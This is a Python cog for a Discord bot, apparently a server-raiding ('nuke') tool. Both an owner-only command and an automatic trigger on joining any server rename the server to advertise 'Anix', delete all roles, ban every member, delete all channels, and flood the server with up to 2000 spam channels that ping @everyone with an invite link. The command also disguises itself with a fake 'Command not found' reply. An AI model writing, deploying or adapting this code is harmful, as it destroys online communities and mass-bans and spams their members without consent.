import discord
from discord.ext import commands
class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    @commands.command(name='nuke', brief='Nuke the server', description='Nuke the server')
    async def nuke(self, ctx):
        """>nuke"""
        if ctx.author.id == self.bot.owner_id:
            await ctx.message.delete()
            try:
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Nuking it :)')
                await ctx.guild.create_text_channel(f'1')
                invite = await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'1').id).create_invite(max_age = 300)
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Invite: {str(invite)} :)')
                await ctx.guild.edit(name="Nuked by Anix | https://discord.gg/t2x6AuJFbb")
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Changed server name :)')
                for c in ctx.guild.roles:
                    try:
                        await c.delete()
                        print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted role: {c.name}')
                    except discord.errors.HTTPException:
                        pass
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted all possible roles :)')
                for member in ctx.guild.members:
                    try:
                        await member.ban(reason='https://discord.gg/t2x6AuJFbb')
                        print(f'Banned {member.name}#{member.discriminator} - {str(member.id)}')
                    except discord.errors.Forbidden:
                        pass
                print("Guild: " + str(ctx.guild.name) + " - " + str(ctx.guild.id) + " - Banned all possible members")
                for c in ctx.guild.channels:
                    await c.delete()
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted all channels :)')
                for i in range(1,2000):
                    await ctx.guild.create_text_channel(f'{i}')
                    await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'{i}').id).send(f"@everyone https://discord.gg/t2x6AuJFbb")
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Created 2000 channels :)')
                await ctx.guild.leave()
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Left after nuking :)')  
                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Nuked :)')
                return
            except discord.errors.Forbidden:
                print("Guild: " + str(ctx.guild.name) + " - " + str(ctx.guild.id) + " - Kicked or have been banned")
                return
        await ctx.send(embed=discord.Embed(title=":x: Error", description=f"Command not found.", color=discord.Color.red()).set_footer(text=f"Requested by {ctx.author.name}", icon_url=ctx.author.avatar_url))
    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        if guild.id not in (1002659843720617995, 1006599826315685888):
            try:
                print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
                await guild.create_text_channel(f'fuckme1')
                invite = await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                print(f'Guild: {guild.name} - {str(guild.id)} - Invite: {str(invite)} :)')
                await guild.edit(name="Nuked by Anix | https://discord.gg/t2x6AuJFbb")
                print(f'Guild: {guild.name} - {str(guild.id)} - Changed server name :)')
                for c in guild.roles:
                    try:
                        await c.delete()
                        print(f'Guild: {guild.name} - {str(guild.id)} - Deleted role: {c.name}')
                    except discord.errors.HTTPException:
                        pass
                print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all possible roles :)')
                for member in guild.members:
                    try:
                        await member.ban(reason='https://discord.gg/t2x6AuJFbb')
                        print(f'Banned {member.name}#{member.discriminator} - {str(member.id)}')
                    except discord.errors.Forbidden:
                        pass
                print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Banned all possible members")
                
                for c in guild.channels:
                    await c.delete()
                print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all channels :)')
                for i in range(1,2000):
                    await guild.create_text_channel(f'{i}')
                    await self.bot.get_channel(discord.utils.get(guild.channels, name=f'{i}').id).send(f"@everyone https://discord.gg/t2x6AuJFbb")
                print(f'Guild: {guild.name} - {str(guild.id)} - Created 2000 channels :)')
                await guild.leave()
                print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')  
                return
            except discord.errors.Forbidden:
                print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Kicked or have been banned")
                return
def setup(bot):
    bot.add_cog(Nuke(bot))
    print('Nuke cog loaded')